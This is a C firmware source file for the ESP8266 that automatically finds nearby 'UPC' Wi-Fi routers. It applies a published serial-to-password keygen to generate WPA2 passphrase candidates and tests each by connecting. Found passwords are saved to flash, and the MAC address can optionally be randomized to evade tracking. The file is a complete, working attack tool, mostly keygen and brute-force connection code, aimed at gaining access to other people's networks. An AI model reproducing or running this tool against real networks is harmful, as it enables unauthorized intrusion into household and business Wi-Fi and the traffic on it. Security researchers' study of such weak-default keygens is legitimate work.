/* esp8266_upc_keys
 * This app automatically applies the keygen described at http://haxx.in/upc-wifi/ to vulnerable APs and tests the resulting candidates
 * In the interval between calling wifi_station_scan and the associated callback a cracker task recovers the remaining targets' passwords
 */

#include "ets_sys.h"
#include "osapi.h"
#include "mem.h"
#include "gpio.h"
#include "os_type.h"
#include "user_config.h"
#include "driver/uart.h"
#include "user_interface.h"

typedef struct {
    uint8_t bssid[6];
    uint8_t password[8];
    uint8_t padding[2];
} saved_ap_t;

typedef struct {
    uint32_t target;
    char *candidate_passwords;
    size_t current_password;
    size_t passwords_found;
    bool finished_cracking;
} crack_job_t;

typedef struct {
    uint8_t essid[32];
    uint8_t bssid[6];
    uint8_t password[8];
    crack_job_t *job;
} ap_t;

size_t aps_found;
ap_t aps[MAX_APS];

crack_job_t * crack_jobs[MAX_JOBS] = {0};
size_t jobs_active;
size_t last_job = 0;

#ifdef MODE_HEADLESS
#define printf(...)
#else
#define printf os_printf
#endif

ICACHE_FLASH_ATTR
static void save_password(size_t ap_index){
    saved_ap_t saved_ap = {{0}};
    size_t saved_aps = 0;
    do {
        spi_flash_read(USER_FLASH_START + (saved_aps*sizeof(saved_ap_t)), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
        saved_aps++;
    } while(saved_ap.password[0] != 0xff && (saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))));
    if(saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))){
        printf("Saving password %s for ESSID %s in slot %u\n", aps[ap_index].password, aps[ap_index].essid, saved_aps - 1);
        memcpy(saved_ap.bssid, aps[ap_index].bssid, 6);
        memcpy(saved_ap.password, aps[ap_index].password, 8);
        spi_flash_write(USER_FLASH_START + (saved_aps-1)*sizeof(saved_ap_t), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
    } else {
        printf("User flash area is full!\n");
    }
}

ICACHE_FLASH_ATTR
static void load_password(size_t ap_index){
    saved_ap_t saved_ap = {{0}};
    size_t saved_aps = 0;
    do {
        spi_flash_read(USER_FLASH_START + (saved_aps*sizeof(saved_ap_t)), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
        if(memcmp(saved_ap.bssid, aps[ap_index].bssid, 6) == 0){
            memcpy(aps[ap_index].password, saved_ap.password, 8);
            printf("Loaded saved password %s for ESSID %s from slot %u\n", aps[ap_index].password, aps[ap_index].essid, saved_aps);
            break;
        }
        saved_aps++;
    } while(saved_ap.password[0] != 0xff && (saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))));
}

void randomize_mac_addr(void){
    char mac[6];
    os_get_random(mac, 6);
    printf("Setting MAC address to: %02x:%02x:%02x:%02x:%02x:%02x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    wifi_set_macaddr(STATION_IF, mac);
}

enum {
    SCANNING,
    TARGETING,
    CONNECTING,
    DISCONNECTING,
} state;

size_t ap_timeouts;
static void crack(os_event_t *events);
static void targets_found(void* arg, STATUS status);

#define user_procTaskQueueLen 1
os_event_t user_procTaskQueue[user_procTaskQueueLen];

size_t global_ap_to_test;
static volatile os_timer_t blink_timer;

void add_cracker_job(crack_job_t *job){
    printf("Adding cracker job...");
    size_t i;
    for(i = 0; i < MAX_JOBS; i++){
        if(!crack_jobs[i]){
            crack_jobs[i] = aps[aps_found].job;
            i++;
            printf(" in slot %u", i);
            jobs_active++;
            break;
        }
    }
    if(i > last_job){
        last_job = i;
    }
    if(last_job == 1){
        // re-start cracker
        system_os_post(PRIO_CRACK, 0, 0 );
    }
    printf("/%u\n", last_job);
    if(i == MAX_JOBS){
        printf("Crack jobs list full!\n");
    }
}

void delete_cracker_job(crack_job_t *job){
    size_t jobs;
    printf("Deleting cracker job...");
    if(job){
        for(jobs = 0; jobs < last_job; jobs++){
            if(crack_jobs[jobs] == job){
                printf(" from slot %u", jobs+1);
                printf("/%u\n", last_job);
                last_job--;
                // re-organise job pointers
                crack_jobs[jobs] = crack_jobs[last_job];
                crack_jobs[last_job] = NULL;
                jobs_active--;
                break;
            }
        }
    }
}

void blink(void *arg){
  if (GPIO_REG_READ(GPIO_OUT_ADDRESS) & (1 << LED_PIN))
  {
    GPIO_OUTPUT_SET(LED_PIN, 0);
  } else {
    GPIO_OUTPUT_SET(LED_PIN, 1);
  }
}


ICACHE_FLASH_ATTR
static void
wifi(os_event_t *events){
    if(state == SCANNING){
        if(aps_found == MAX_APS){
            printf("Flushing AP buffer...\n");
            // flush AP buffer (found passwords will be re-loaded from flash, jobs will be re-linked by their target id)
            aps_found = 0;
            memset(aps, 0x0, sizeof(aps));
        }
        size_t i;
        for(i = 0; i < MAX_APS; i++){
            if(strlen(aps[i].password) == 8){
                printf("Cracked | AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (password: %s )\n", aps[i].bssid[0], aps[i].bssid[1], aps[i].bssid[2], aps[i].bssid[3], aps[i].bssid[4], aps[i].bssid[5], aps[i].essid, aps[i].password);
            }

            if(aps[i].job){
                if(aps[i].job->finished_cracking && aps[i].job->current_password >= aps[i].job->passwords_found){
                    printf("Finished testing passwords for ESSID %s\n", aps[i].essid);
                    memcpy(aps[i].password, "UNKNOWN", 7);
                    aps[i].password[7] = 0;
                    if(aps[i].job){
                        delete_cracker_job(aps[i].job);
                        os_free(aps[i].job->candidate_passwords);
                        os_free(aps[i].job);
                        aps[i].job = NULL;
                    }
                    save_password(i);
                }
            }
        }
        state = TARGETING;
        wifi_station_scan(NULL, targets_found);
    } else if(state == CONNECTING || state == DISCONNECTING){

        if(ap_timeouts == MAX_TRIES){
            printf("AP not reachable for %u trie(s), aborting\n", MAX_TRIES);
            state = DISCONNECTING;
        }

        if(state == DISCONNECTING){
            wifi_station_disconnect();
            state = SCANNING;
            ap_timeouts = 0;
            GPIO_OUTPUT_SET(LED_PIN, 1);
        } else {
            switch(wifi_station_get_connect_status()){
                case STATION_CONNECTING:
                default:
                    break;
                case STATION_WRONG_PASSWORD:
                    printf("Wrong password!\n");
                    aps[global_ap_to_test].job->current_password++;
                    if(aps[global_ap_to_test].job->current_password >= aps[global_ap_to_test].job->passwords_found){
                        state = DISCONNECTING;
                        break;
                    }
                    // fall through
                case STATION_IDLE: {
                    wifi_station_disconnect();
                    ap_timeouts = 0;
                    struct station_config config = {{0}};
                    memcpy(config.ssid, aps[global_ap_to_test].essid, 10);
                    memcpy(config.password, aps[global_ap_to_test].job->candidate_passwords+(8*aps[global_ap_to_test].job->current_password), 8);
                    memcpy(config.bssid, aps[global_ap_to_test].bssid, 6);
                    config.bssid_set = 0;
                    printf("Connecting to %s with password %s\n", config.ssid, config.password);
#ifdef SPOOF_MAC
                    randomize_mac_addr();
#endif
                    wifi_station_set_config(&config);
                    wifi_station_connect();
                    state = CONNECTING;
                    break;
                  }
                case STATION_NO_AP_FOUND:
                    ap_timeouts++;
                    wifi_station_connect();
                    break;
                case STATION_CONNECT_FAIL:
                    wifi_station_disconnect();
                    printf("Error connecting... retrying now\n");
                    ap_timeouts++;
                    wifi_station_connect();
                    break;
                case STATION_GOT_IP: {
                    memcpy(aps[global_ap_to_test].password, aps[global_ap_to_test].job->candidate_passwords+(8*aps[global_ap_to_test].job->current_password), 8);
                    printf("Found valid password for %s: %s\n", aps[global_ap_to_test].essid, aps[global_ap_to_test].password);
                    save_password(global_ap_to_test);
                    printf("Saved password to user flash\n");
                    delete_cracker_job(aps[global_ap_to_test].job);
                    aps[global_ap_to_test].job = NULL;
                    // no need to test more
                    state = DISCONNECTING;
                    break;
                 }
            }
        }
        system_os_post(PRIO_WIFI, 0, 0 );
    }
}

// callback for scan
ICACHE_FLASH_ATTR
static void
targets_found(void* arg, STATUS status){
    struct bss_info *bss_link = (struct bss_info *)arg;
    int8_t best_link = MIN_STRENGTH;
    size_t i;
    size_t ap_to_test = -1;
    while (bss_link != NULL){
        bool found = false;
        for(i = 0; i < aps_found; i++){
            if(strncmp(aps[i].essid, bss_link->ssid, 32) == 0){
                found = true;
                printf("Saw known AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB)", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi);
                if(aps[i].password[0]){
                    printf(" (password: %s )", aps[i].password);
                } else if(aps[i].job){
                    printf(" [TARGETED %u/%u]", aps[i].job->current_password, aps[i].job->passwords_found);
                    if(aps[i].job->current_password < aps[i].job->passwords_found && bss_link->rssi > best_link){
                        best_link = bss_link->rssi;
                        ap_to_test = i;
                    }
                }
                printf("\n");
            }
        }
        if(!found && aps_found < MAX_APS){
            printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB)\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi);
            memcpy(aps[aps_found].bssid, bss_link->bssid, 6);
            memcpy(aps[aps_found].essid, bss_link->ssid, 32);

            load_password(aps_found);
            if(!aps[aps_found].password[0]){
                if(strncmp(aps[aps_found].essid, "UPC", 3) == 0 && strlen(aps[aps_found].essid) == 10){
                    aps[aps_found].job = os_zalloc(sizeof(crack_job_t));
                    for(i = 3; i < 10; i++){
                        aps[aps_found].job->target *= 10;
                        aps[aps_found].job->target += aps[aps_found].essid[i]-0x30;
                    }
                    add_cracker_job(aps[aps_found].job);
                }
            }
            aps_found++;
        }

        bss_link = bss_link->next.stqe_next;
    }
    if(ap_to_test != -1){
        printf("Connecting to ESSID %s...\n", aps[ap_to_test].essid);
        os_timer_disarm(&blink_timer);
        GPIO_OUTPUT_SET(LED_PIN, 0);
        state = CONNECTING;
        global_ap_to_test = ap_to_test;
    } else {
        if(jobs_active){
            os_timer_arm(&blink_timer, 1000/jobs_active, 1);
        } else {
            os_timer_disarm(&blink_timer);
        }
        state = SCANNING;
    }
    system_os_post(PRIO_WIFI, 0, 0 );
}

ICACHE_FLASH_ATTR
void user_init()
{
    // set up LED
    gpio_init();
    GPIO_OUTPUT_SET(LED_PIN, 1);

    // set up blinking of LED
    os_timer_setfn(&blink_timer, blink, NULL);

#ifndef MODE_HEADLESS
    uart_init(115200, 115200);
    os_delay_us(100);
#endif


    wifi_set_opmode(STATION_MODE);
    wifi_station_set_auto_connect(false);
    wifi_station_dhcpc_stop();
    wifi_station_set_hostname("esp8266_upc_keys");

    struct ip_info info;
    info.ip.addr = ipaddr_addr("192.168.13.37");
    info.netmask.addr = ipaddr_addr("255.255.255.0");
    info.gw.addr = ipaddr_addr("192.168.1.1");
    wifi_set_ip_info(STATION_IF, &info);

    system_update_cpu_freq(SYS_CPU_160MHZ);

    // set up tasks
    system_os_task(wifi, PRIO_WIFI, user_procTaskQueue, user_procTaskQueueLen);
    system_os_task(crack, PRIO_CRACK, user_procTaskQueue, user_procTaskQueueLen);

    // start scanning
    memset(aps, 0x0, sizeof(aps));
    aps_found = 0;
    state = SCANNING;
    system_os_post(PRIO_WIFI, 0, 0 );
}

typedef struct md5_ctx
{
  uint32_t A;
  uint32_t B;
  uint32_t C;
  uint32_t D;

  uint32_t total[2];
  uint32_t buflen;
  uint32_t buffer[32];
} MD5_CTX;
int (*MD5_Init)(MD5_CTX *c) = 0x40009818;
int (*MD5_Update)(MD5_CTX *c, const void *data, unsigned long len) = 0x40009834;
int (*MD5_Final)(unsigned char *md, MD5_CTX *c) = 0x40009900;


/*
 * ----------------------------------------------------------------------------
 * "THE BLASTY-WAREZ LICENSE" (Revision 1):
 * <peter@haxx.in> wrote this file. As long as you retain this notice and don't
 * sell my work you can do whatever you want with this stuff. If we meet some 
 * day, and you think this stuff is worth it, you can intoxicate me in return.
 * ----------------------------------------------------------------------------
 */

#define MAGIC_24GHZ 0xff8d8f20
#define MAGIC_5GHZ 0xffd9da60
#define MAGIC0 0xb21642c9ll
#define MAGIC1 0x68de3afll
#define MAGIC2 0x6b5fca6bll

#define MAX0 9
#define MAX1 368
#define MAX2 6800

ICACHE_FLASH_ATTR
void hash2pass(uint8_t *in_hash, char *out_pass)
{
	uint32_t i, a;

	for (i = 0; i < 8; i++) {
		a = in_hash[i] & 0x1f;
		a -= ((a * MAGIC0) >> 36) * 23;

		a = (a & 0xff) + 0x41;

		if (a >= 'I') a++;
		if (a >= 'L') a++;
		if (a >= 'O') a++;

		out_pass[i] = a;
	}
	out_pass[8] = 0;
}


ICACHE_FLASH_ATTR
uint32_t mangle(uint32_t *pp)
{
	uint32_t a, b;

	a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
	b = (pp[3] - a * 9999 + 1) * 11ll;

	return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
}

__attribute((optimize("O3")))
ICACHE_FLASH_ATTR
uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
{
    uint64_t a = data[0] * 2500000 + data[1] * 6800 + data[2] + magic;
    return a - (((a * MAGIC2) >> 54) - (a >> 31)) * 10000000;
}

uint32_t buf[3] = {0, 0, 0};
__attribute((optimize("O3")))
ICACHE_FLASH_ATTR
static void crack(os_event_t *events){
    if(!last_job){
        return;
    }
    size_t jobs;
    crack_job_t *job;
    for(jobs = 0; jobs < last_job; jobs++){
        system_soft_wdt_feed();
        job = crack_jobs[jobs];
        if(!job){
            continue;
        }
        if (upc_generate_ssid(buf, MAGIC_24GHZ) != job->target)
            continue;

        char serial[64];
        char pass[9], tmpstr[17];
        uint8_t h1[16], h2[16];
        uint32_t hv[4], w1, w2, i;
        MD5_CTX ctx;

        os_sprintf(serial, "SAAP%d%03d%d", buf[0], buf[1], buf[2]);

        MD5_Init(&ctx);
        MD5_Update(&ctx, serial, strlen(serial));
        MD5_Final(h1, &ctx);

        for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t *)(h1 + i*2);
        }

        w1 = mangle(hv);

        for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t *)(h1 + 8 + i*2);
        }

        w2 = mangle(hv);

        os_sprintf(tmpstr, "%08X%08X", w1, w2);

        MD5_Init(&ctx);
        MD5_Update(&ctx, tmpstr, strlen(tmpstr));
        MD5_Final(h2, &ctx);

        hash2pass(h2, pass);
        for(i = 0; i < job->passwords_found; i++){
            if(memcmp(pass, job->candidate_passwords+(i*8), 8) == 0){
                // job will be freed after testing
                job->finished_cracking = true;
                break;
            }
        }
        if(!job->finished_cracking){
            printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);

            job->passwords_found++;
            size_t required_size = 8*job->passwords_found;
            if(job->candidate_passwords){
                job->candidate_passwords = os_realloc(job->candidate_passwords, required_size);
            } else {
                job->candidate_passwords = os_zalloc(required_size);
            }
            memcpy(job->candidate_passwords+(8*(job->passwords_found-1)), pass, 8);
        } else {
            printf("Finished generating passwords for target UPC%07d\n", job->target);
            delete_cracker_job(job);
        }
    }

    buf[2]++;
    if(buf[2] == MAX2+1){
        buf[2] = 0;
        buf[1]++;
    }
    if(buf[1] == MAX1+1){
        buf[1] = 0;
        printf("Cracking %u target(s)... %u/%u\n", jobs_active, buf[0], MAX0);
        buf[0]++;
    }
    if(buf[0] == MAX0+1){
        buf[0] = 0;
        buf[1] = 0;
        buf[2] = 0;
    }

    system_os_post(PRIO_CRACK, 0, 0);
}
